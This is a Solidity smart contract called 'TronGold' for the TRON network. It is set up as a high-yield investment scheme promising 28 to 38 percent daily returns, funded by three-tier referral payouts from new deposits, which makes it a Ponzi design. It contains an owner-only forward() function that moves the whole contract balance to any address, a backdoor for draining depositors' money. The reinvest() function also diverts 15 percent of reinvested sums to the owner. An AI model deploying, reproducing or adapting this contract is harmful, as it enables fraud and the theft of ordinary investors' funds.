//SourceUnit: TronGold.sol

pragma solidity ^0.4.25;

contract TronGold {

    using SafeMath for uint256;

    uint256 public constant TRON = 1000000;

    uint256 public minDepositSize = 30 * TRON;//100000000
    uint256 public interestRateDivisor = 1000000000000;//1000000000000
    uint256 public comissionsRate = 1;
    uint256 public commissionDivisor = 100;
    uint256 public startTime = 1598450400; //1598450400

    uint256 public totalPlayers;
    uint256 public totalIncome;
    uint256 public totalPayout;

    address public owner;

    struct Player {
        uint256 trxDeposit;
        uint256 time;
        uint256 interestProfit;
        uint256 currLevel;
        uint256 affInvestTotal;
        uint256 affRewards;
        address affFrom;
        uint256 aff1sum; //2 level
        uint256 aff2sum;
        uint256 aff3sum;
    }

    struct Level {
        uint256 interest;    // interest per seconds %
        uint256 minInvestment;    // investment requirement
    }

    struct InvestHistory{
      address who;
      address referral;
      uint256 amount;
      uint256 time;
    }

    struct WithdrawHistory{
      address who;
      uint256 amount;
      uint256 time;
    }

    mapping(address => Player) public players;
    mapping(uint256 => address) public indexToPlayer;
    mapping(address => InvestHistory[]) private investHistorys;
    mapping(address => WithdrawHistory[]) private withdrawHistorys;
    mapping(uint256 => Level) private level_;

    event Deposit(address who, address affFrom, uint256 amount, uint256 time);
    event Withdraw(address who, uint256 amount, uint256 time);

    constructor() public {

      level_[0] =  Level(3240741, minDepositSize); //daily 28
      level_[1] =  Level(3472222, 5000 * TRON);    //daily 30
      level_[2] =  Level(3703704, 10000 * TRON);   //daily 32
      level_[3] =  Level(4050926, 50000 * TRON);   //daily 35
      level_[4] =  Level(4398148, 100000 * TRON);   //daily 38

      owner = msg.sender;
    }

    function calculateCurrLevel(address _addr) private{

      uint256 totalInvestment = players[_addr].trxDeposit;
      uint256 totalAmount = totalInvestment.add(players[_addr].affInvestTotal);

      if(totalAmount < level_[1].minInvestment){
        players[_addr].currLevel = 0;
      }
      else if(totalAmount < level_[2].minInvestment){
        players[_addr].currLevel = 1;
      }
      else if(totalAmount < level_[3].minInvestment){
        players[_addr].currLevel = 2;
      }
      else if(totalAmount < level_[4].minInvestment){
        players[_addr].currLevel = 3;
      }
      else{
        players[_addr].currLevel = 4;
      }
    }

    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];

      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;

      players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
      players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
      players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
      indexToPlayer[totalPlayers] = _addr;
    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable {
        require(now >= startTime);
        collect(msg.sender);
        require(msg.value >= minDepositSize);
        uint256 depositAmount = msg.value;

        Player storage player = players[msg.sender];
        player.trxDeposit = player.trxDeposit.add(depositAmount);

        if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && _affAddr != msg.sender && players[_affAddr].trxDeposit >= minDepositSize){
              register(msg.sender, _affAddr);
            }
            else{
              register(msg.sender, owner);
            }
        }

        calculateCurrLevel(msg.sender);

        distributeRef(depositAmount, player.affFrom);

        totalIncome = totalIncome.add(depositAmount);

        uint256 comissions = depositAmount.mul(comissionsRate).div(commissionDivisor);
        owner.transfer(comissions);

        investHistorys[msg.sender].push(InvestHistory(msg.sender,player.affFrom,depositAmount,now));

        emit Deposit(msg.sender,player.affFrom, depositAmount, now);
    }

    function withdraw() public payable{
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);
        address _receiver = msg.sender;
        uint256 _amount = players[msg.sender].interestProfit;
        if (_amount > 0 && _receiver != address(0)) {
          uint256 contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint256 payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.interestProfit = player.interestProfit.sub(payout);

                msg.sender.transfer(payout);
                withdrawHistorys[msg.sender].push(WithdrawHistory(msg.sender,payout,now));

                emit Withdraw(_receiver,payout, now);
            }
        }
    }

    function reinvest() public {
        collect(msg.sender);
        Player storage player = players[msg.sender];
        uint256 depositAmount = player.interestProfit;
        require(contractBalance() >= depositAmount);
        player.interestProfit = 0;
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        calculateCurrLevel(msg.sender);

        uint256 refAmount = depositAmount.mul(15).div(100);
        owner.transfer(refAmount);
        players[owner].affRewards = players[owner].affRewards.add(refAmount);

        uint256 comissions = depositAmount.mul(comissionsRate).div(commissionDivisor);
        owner.transfer(comissions);

        investHistorys[msg.sender].push(InvestHistory(msg.sender,player.affFrom,depositAmount,now));
    }


    function collect(address _addr) private {
        Player storage player = players[_addr];
        uint256 secondsPassed =  now.sub(player.time);
        if (secondsPassed > 0 && player.time > 0) {
            uint256 collectProfit = (player.trxDeposit.mul(secondsPassed.mul(level_[player.currLevel].interest))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secondsPassed);
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{

        uint256 _allaff = (_trx.mul(15)).div(100);

        address _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        uint256 _affRewards = 0;

        if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(8)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            _affAddr1.transfer(_affRewards);
        }

        if (_affAddr2 != address(0)) {
            _affRewards = (_trx.mul(5)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            _affAddr2.transfer(_affRewards);
        }

        if (_affAddr3 != address(0)) {
            _affRewards = (_trx.mul(2)).div(100);
            _allaff = _allaff.sub(_affRewards);
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
            _affAddr3.transfer(_affRewards);
        }

        if(_allaff > 0 ){
            players[owner].affRewards = _allaff.add(players[owner].affRewards);
            owner.transfer(_allaff);
        }
    }

    function getProfit(address _addr) public view returns (uint256,uint256) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);

      uint256 secondsPassed = now.sub(player.time);
      if (secondsPassed > 0) {
          uint256 collectProfit = (player.trxDeposit.mul(secondsPassed.mul(level_[player.currLevel].interest))).div(interestRateDivisor);
      }
      return (collectProfit.add(player.interestProfit),now);
    }

    function forward(address _addr) public returns (bool success){
      require(msg.sender == owner, "unathorized call");
      _addr.transfer(address(this).balance);
      return true;
    }

    function contractBalance() public view returns (uint256){
      return address(this).balance;
    }

    function getPlayer(address _addr) public view returns (uint256, uint256, uint256, uint256){
      return (players[_addr].trxDeposit,players[_addr].time,players[_addr].currLevel,players[_addr].affInvestTotal);
    }

    function getInvestHistorys(address _addr) public view returns (address[] memory, address[] memory, uint256[] memory, uint256[] memory) {
        uint256 size = investHistorys[_addr].length;
        uint256 start = 0;
        if(size > 200){
          start = size.sub(200);
        }
        address[] memory addresses = new address[](size.sub(start));
        address[] memory affAddresses = new address[](size.sub(start));
        uint256[] memory amounts = new uint256[](size.sub(start));
        uint256[] memory times = new uint256[](size.sub(start));

        uint256 index = 0;
        for (uint256 i = start; i < size; i++) {
            InvestHistory storage invest = investHistorys[_addr][i];
            addresses[index] = invest.who;
            affAddresses[index] = invest.referral;
            amounts[index] = invest.amount;
            times[index] = invest.time;
            index = index.add(1);
        }
        return
        (
        addresses,
        affAddresses,
        amounts,
        times
        );
    }

    function getWithdrawHistorys(address _addr) public view returns (address[] memory, uint256[] memory, uint256[] memory) {
        uint256 size = withdrawHistorys[_addr].length;
        uint256 start = 0;
        if(size > 200){
          start = size.sub(200);
        }
        address[] memory addresses = new address[](size.sub(start));
        uint256[] memory amounts = new uint256[](size.sub(start));
        uint256[] memory times = new uint256[](size.sub(start));
        uint256 index = 0;
        for (uint256 i = start; i < size; i++) {
            WithdrawHistory storage withdrawRecord = withdrawHistorys[_addr][i];
            addresses[index] = withdrawRecord.who;
            amounts[index] = withdrawRecord.amount;
            times[index] = withdrawRecord.time;
            index = index.add(1);
        }
        return
        (
        addresses,
        amounts,
        times
        );
    }
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}